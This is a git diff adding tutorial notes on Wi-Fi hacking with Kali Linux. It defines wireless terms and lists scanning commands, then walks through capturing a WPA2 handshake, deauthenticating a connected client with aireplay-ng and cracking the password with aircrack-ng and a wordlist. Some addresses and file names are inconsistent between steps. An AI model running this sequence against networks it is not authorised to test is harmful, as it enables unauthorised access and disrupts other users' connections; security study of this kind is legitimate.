@@ -1,3 +1,163 @@
+
 The ability to scan for and connect to other network devices from your system is crucial to becoming a successful hacker, and with wireless technologies like Wi-Fi (IEEE 802.11) and Bluetooth being the standard, finding and controlling Wi-Fi and Bluetooth connections is key. If someone can hack a wireless connection, they can gain entry to a device and access to confidential information.
+
+-- Wi-Fi terms and technologies --
+
+AP (access point): This is the device wireless users connect to for internet access.
+ESSID (extended service set identifier): This is the same as the SSID, but it can be used for multiple APs in a wireless LAN.
+BSSID (basic service set identifier): This is the unique identifier of each AP, and it is the same as the MAC address of the device.
+SSID (service set identifier): This is the name of the network.
+Channels: Wi-Fi can operate on any one of 14 channels (1–14). In the United States, Wi-Fi is limited to channels 1–11
+Power: The closer you are to the Wi-Fi AP, the greater the power, and the easier the connection is to crack.
+
+Security This is the security protocol used on the Wi-Fi AP that is being read from. There are three primary security protocols for Wi-Fi. 
+
+- Wired Equivalent Privacy (WEP), was badly flawed and easily cracked. 
+- Wi-Fi Protected Access (WPA), was a bit more secure. 
+- WPA2-PSK, which is much more secure and uses a preshared key (PSK) that all users share, is now used by nearly all Wi-Fi APs (except enterprise Wi-Fi).
+
+Modes Wi-Fi can operate in one of three modes: managed, master, or monitor
+
+- Managed: which means it is ready to join or has joined an AP
+- Master: which means it is ready to act as or already is an AP
+- Monitor: which we’ll discuss a little later in the chapter.
+
+Wireless range In the United States, a Wi-Fi AP must legally broadcast its signal at an upper limit of 0.5 watts. At this power, it has a normal range of about 300 feet (100 meters). High-gain antennas can extend this range to as much as 20 miles.
+
+Frequency Wi-Fi is designed to operate on 2.4GHz and 5GHz. Modern Wi-Fi APs and wireless network cards often use both.
+
+
+-- Basic Wireless Commands --
+
+In Kali Linux, Wi-Fi interfaces are usually designated as wlanX, with X representing the number of that interface.
+
+   kali >ifconfig
+   eth0Linkencap:EthernetHWaddr 00:0c:29:ba:82:0f
+   inet addr:192:168.181.131 Bcast:192.168.181.255 Mask:255.255.255.0
+   --snip--
+   lo Linkencap:Local Loopback
+   inet addr:127.0.0.1 Mask:255.0.0.0
+   --snip--
+➊ wlan0 Link encap:EthernetHWaddr 00:c0:ca:3f:ee:02
+
+# See your Wi-Fi interfaces
+
+kali >iwconfig
+lo    no wireless extensions
+
+wlan0 IEEE 802.11bg   ESSID:off/any
+      Mode:Managed   Access Point:Not-Associated   Tx-Power=20 dBm
+      Retry short limit:7   RTS   thr:off   Fragment thr:off
+      Encryption key:off
+      Power Management:off
+
+eth0   no wireless extensions
+
+# See all the wireless access points your network card can reach
+
+kali >iwlist wlan0 scan
+wlan0       Scan completed:
+            Cell 01 - Address: 88:AD:43:75:B3:82
+                      Channel:1
+                      Frequency:2.412GHz (Channel 1)
+                      Quality=70/70   Signal level =-38 dBm
+                      Encryption key:off
+                      ESSID:"Hackers-Arise"
+--snip--
+
+# View the Wi-Fi APs near you and their key data
+
+kali >nmcli dev wifi
+*  SSID           MODE    CHAN   RATE            SIGNAL   BARS   SECURITY
+   Hackers-Arise  Infra   1      54 Mbits/s      100             WPA1 WPA2
+   Xfinitywifi    Infra   1      54 Mbits/s      75              WPA2
+   TPTV1          Infra   11     54 Mbits/s      44              WPA1 WPA2
+
+--snip--
+
+# Connect to APs
+
+nmcli dev wifi connect AP-SSID password APpassword
+
+kali >nmcli dev wifi connect Hackers-Arise password 12345678
+Device 'wlan0' successfully activated with '394a5bf4-8af4-36f8-49beda6cb530'.
+
+
+-- Wi-Fi Recon with aircrack-ng --
+
+You will need the MAC address of the target AP (BSSID), the MAC address of a client (another wireless network card), and the channel the AP is operating on in order to perform any kind of hacking, so this is valuable information.
+
+The airmon-ng command put your wireless network card in monitor mode. 
+
+airmon-ng start|stop|restart interface
+
+kali >airmon-ng start wlan0
+Found three processes that could cause trouble
+If airodump-ng, aireplay-ng, or airtun-ng stops working after
+a short period of time, you may want to run 'airmon-ng check kill'
+--snip--
+PHY         INTERFACE         DRIVER      Chipset
+phy0        wlan0             rt18187     Realtek Semiconductor Corp RTL8187
+
+    (mac8311 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+
+--snip--
+
+Note that airmon-ng will rename your wireless interface: mine has been renamed “wlan0mon,” though yours may be different. 
+
+The airodump-ng command captures and displays the key data from broadcasting APs and any clients connected to those APs or within the vicinity. 
+
+BSSID: The MAC address of the AP or client
+PWR: The strength of the signal
+ENC: The encryption used to secure the transmission
+#Data: The data throughput rate
+CH: The channel the AP is operating on
+ESSID: The name of the AP
+
+kali >airodump-ng wlan0mon
+CH   9][   Elapsed: 28 s ][   2018-02-08 10:27
+
+BSSID               PWR Beacons #Data #/s   CH MB   ENC   CIPHER   AUTH   ESSID
+01:01:AA:BB:CC:22   -1        4    26   0   10 54e WPA2   CCMP    PSK   Hackers-
+Arise
+
+--snip--
+
+BSSID               Station             PWR   Rate   Lost   Frames   Probe
+(not associated)    01:01:AA:BB:CC:22
+01:02:CC:DD:03:CF   A0:A3:E2:44:7C:E5
+
+
+Note that airodump-ng splits the output screen into an upper and lower portion. The upper portion has information on the broadcasting APs, including the BSSID, the power of the AP, how many beacon frames have been detected, the data throughput rate, how many packets have traversed the wireless card, the channel (1–14), the theoretical throughput limit, the encryption protocol, the cipher used for encryption, the authentication type, and the ESSID (commonly referred to as SSID). In the client portion, the output tells us that one client is not associated, meaning it has been detected but is not connected to any AP, and that another is associated with a station, meaning it’s connected to the AP at that address.
+
+Now you have all the information you need to crack the AP!
+
+airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
+
+In another terminal, you can use the aireplay-ng command to knock off (deauthenticate) anyone connected to the AP and force them to reauthenticate to the AP.
+
+aireplay-ng --deauth 100 -a 01:02:CC:DD:03:CF –c A0:A3:E2:44:7C:E5 wlan0mon
+
+
+Finally, in the final terminal, you can use a password list (wordlist.dic) to find the password in the captured hash (Hackers-ArisePSK.cap)
+
+aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap
+
+
+-- Commands Overview --
+
+kali >airmon-ng start wlan0
+kali >airodump-ng wlan0mon
+kali >airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
+kali >aireplay-ng --deauth 100 -a 01:02:CC:DD:03:CF –c A0:A3:E2:44:7C:E5 wlan0mon
+kali >aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap
+
+
+
+-- Detecting and Connecting to Bluetooth --
+
+
+
+
 
 
